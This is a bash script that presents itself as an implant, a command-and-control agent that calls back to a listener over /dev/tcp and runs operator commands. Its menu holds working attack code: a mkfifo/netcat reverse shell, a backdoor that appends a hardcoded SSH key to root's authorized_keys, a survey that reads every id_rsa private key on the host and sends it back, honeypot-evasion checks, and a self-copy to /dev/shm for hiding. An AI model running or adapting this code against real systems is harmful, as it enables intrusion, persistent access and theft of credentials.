#!/bin/bash
red='\e[31m'
lred='\e[91m'
green='\e[32m'
lgreen='\e[92m'
yellow='\e[33m'
lyellow='\e[93m'
blue='\e[34m'
lblue='\e[94m'
magenta='\e[35m'
lmagenta='\e[95m'
cyan='\e[36m'
lcyan='\e[96m'
grey='\e[90m'
lgrey='\e[37m'
white='\e[97m'
black='\e[30m'
##)
#( bg
b_red='\e[41m'
b_lred='\e[101m'
b_green='\e[42m'
b_lgreen='\e[102m'
b_yellow='\e[43m'
b_lyellow='\e[103m'
b_blue='\e[44m'
b_lblue='\e[104m'
b_magenta='\e[45m'
b_lmagenta='\e[105m'
b_cyan='\e[46m'
b_lcyan='\e[106m'
b_grey='\e[100m'
b_lgrey='\e[47m'
b_white='\e[107m'
b_black='\e[40m'
##)
#( special
reset='\e[0;0m'
bold='\e[01m'
italic='\e[03m'
underline='\e[04m'
inverse='\e[07m'
conceil='\e[08m'
crossedout='\e[09m'
bold_off='\e[22m'
italic_off='\e[23m'
underline_off='\e[24m'
inverse_off='\e[27m'
conceil_off='\e[28m'
crossedout_off='\e[29m'
#unset HISTFILE

ready () {
  eval 'printf "${lgreen}Ready:\r\nEnter help to see menu:${reset} \r\n" >&3;'
}


while [ true ]; do

    arr[0]="127.0.0.1"
        svr=${arr[0]}

        eval 'exec 3<>/dev/tcp/$svr/9001;'
        if [[ ! "$?" -eq 0 ]] ; then
            continue
        fi

    eval 'printf "${red}$(date)${reset}\r\n" >&3;'

    if [[ ! "$?" -eq 0 ]] ; then
            continue
        fi
        eval 'printf "${bold}Agent Name:${bold_off} $(md5sum /etc/passwd | cut -d '/' -f1)\r\n" >&3;'
    eval 'ready >&3;'
        if [[ ! "$?" -eq 0 ]] ; then
            continue
        fi
  
        while [ true ]; do
            eval "read msg_in <&3;"

                if [[ ! "$?" -eq 0 ]] ; then
                    break
                fi

                if  [[ "$msg_in" =~ "ping" ]] ; then
                    eval 'printf "${green}succ %s${reset}\r\n" "${msg_in:5}" >&3;'
                        if [[ ! "$?" -eq 0 ]] ; then
                            break
                        fi
                        sleep 1
                        eval 'printf "${green}joined${reset}\r\n\r\n" >&3;'
            eval 'ready >&3;'

                        if [[ ! "$?" -eq 0 ]] ; then
                                break
                        fi
            elif [[ "$msg_in" =~ "help" ]] ; then
            eval 'printf "${bold}Help Menu:${bold_off}\r\n${bold}ping${bold_off} [*] check connection\r\n${bold}cgroup${bold_off} [*] see cgroups\r\n${bold}sshkey${bold_off} [*] store ssh pub key in /root/.ssh/\r\n${bold}ld${bold_off} [*] dir listing\r\n${bold}honeypot${bold_off} [*] check for cowrie honeypot\r\n${bold}help${bold_off} [*] display commands\r\n${bold}ps${bold_off} [*] process list tree\r\n${bold}netstat${bold_off} [*] view connections\r\n${bold}users${bold_off} [*] see logged on users\r\n${bold}shell${bold_off} [*] spawn remote shell\r\n${bold}traceroute${bold_off} [*] see path to remote machine\r\n${bold}exit${bold_off} [*] quit session\r\n\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "traceroute" ]] ; then
            eval 'printf "traceroute 8.8.8.8: $(traceroute 8.8.8.8 > /tmp/trace)\r\n" >&3;'
            sleep 3
            eval 'printf "getting data: $(cat /tmp/trace)\r\n" >&3;'
            rm /tmp/trace
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "shell" ]]; then
            eval 'printf "Start a listener on 9002:\r\n" >&3;'
            sleep 10
            eval '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 9002 >/tmp/f)'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "ld" ]]; then
           eval 'printf "Dir: $(pwd)\r\n" >&3;'
           eval
           eval 'printf "Listing: $(ls -lartF)\r\n" >&3;'

        #elif [[ "$msg_in" =~ "lt \$1" ]]; then
        #   eval 'printf "Listing: $(ls -lartF $1)\r\n" >&3;'   
        elif [[ "$msg_in" =~ "users" ]]; then
            eval 'printf "Logged on users: $(w)\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "honeypot" ]]; then
            eval 'printf "Starting honeypot checks:\r\n" >&3;'
            view=$(which cat)

            if [ "$($view /etc/hostname | grep srv04)" ]; then
                eval 'printf "Honeypot detected!!!\r\n" >&3;'
                    exit 4
            else
                    eval 'printf "Hostname is NOT srv04\r\n" >&3;'
            fi
            look=$(which ls)
            if [ "$($look /home | grep 'phil' && $view /proc/version | grep "Debian 4.")" ]; then 
                eval 'printf "Honeypot detected!!!\r\n" >&3;'
                    exit 5
            else
                    eval 'printf "No phil user detected\r\n" >&3;'
            fi
            if [ "$(which file)" ]; then
                    eval 'printf "file command on the box\r\n" >&3;'
            else      
                eval 'printf "Honeypot detected!!!\r\n" >&3;'
                    exit 6
            fi
            fake=$(ping -c 4 999.999.999.999 | grep "64 bytes" | cut -d " " -f1,2)
            if [ "$fake" ];then 
                eval 'printf "Honeypot detected!!!\r\n" >&3;'
                    exit 7
            else
                    eval 'printf "Fake internet not detected\r\n" >&3;'
                eval 'printf "Honey pot checks over, no cowrie hp detected\n\r" >&3;'
                eval 'ready >&3;'
            fi
        elif [[ "$msg_in" =~ "ps" ]]; then
            eval 'printf "Process list: $(ps -ef 2>/dev/null)\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "netstat" ]]; then
            eval 'printf "Connections: $(netstat -antpu 2>/dev/null || ss -tulwn 2>/dev/null)\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "cgroup" ]]; then
            eval 'printf "cgroup: $(systemd-cgls --no-pager 2>/dev/null)\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "sshkey" ]]; then
            perms=$(id | grep uid | cut -d ' ' -f1 | cut -d '=' -f2 | cut -d '(' -f1)
            if [ $perms -eq 0 ]; then
                mkdir -p /root/.ssh 2>/dev/null
                echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys
                eval 'printf "Sending authorized_keys file back: $(cat /root/.ssh/authorized_keys)\r\n" >&3;'
                eval 'ready >&3;'
            else
                eval 'printf "You are not root!! SSH Key not added\r\n" >&3;'
                eval 'ready >&3;'
            fi 
        elif [[ "$msg_in" =~ "survey" ]]; then
            eval 'printf "public ip information: $(curl ipinfo.io 2>/dev/null; sleep 1)\r\n\n" >&3;'
            eval 'printf "ip information: $(ip a | ifconfig)\r\n\n" >&3;'
            eval 'printf "perms: $(id)\r\n\n" >&3;'  
            eval 'printf "os, kernel: $(uname -a)\r\n\n" >&3;'
            eval 'printf "ssh keys: $(find / -type f -name "id_rsa" 2>/dev/null -exec cat {} \;)\r\n\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "exit" ]]; then
            eval 'printf "${bold}${red}implant exiting, goodbye${reset}\r\n" >&3;'
            exit 0
        elif [[ "$msg_in" =~ "hide" ]]; then
            eval 'printf "${bold}implant hiding, will call back shortly on the same port\r\n" >&3;'
            cp implant.sh /dev/shm
            sleep 5
            source /dev/shm/implant.sh || bash /dev/shm/implant.sh
            exit 0
             
#module for the survey so its not auto at the begining
#potentially add colors from linpeas
#potentially a module to hide it with -exec a copy itself to devshm spawn second on a new listener and kill the first???
        else
            eval 'printf "That is not a valid command:\r\n" >&3;'      
                fi
        done
done
